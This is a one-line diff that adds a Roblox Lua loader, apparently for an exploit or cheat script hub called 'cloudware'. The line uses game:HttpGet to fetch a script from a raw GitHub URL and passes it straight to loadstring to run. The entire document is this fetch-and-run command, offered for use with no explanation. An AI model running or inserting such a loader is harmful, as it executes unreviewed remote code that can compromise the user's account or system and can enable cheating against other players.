@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/gravelua/cloudwareV0.1/main/V0.1.lua"))()
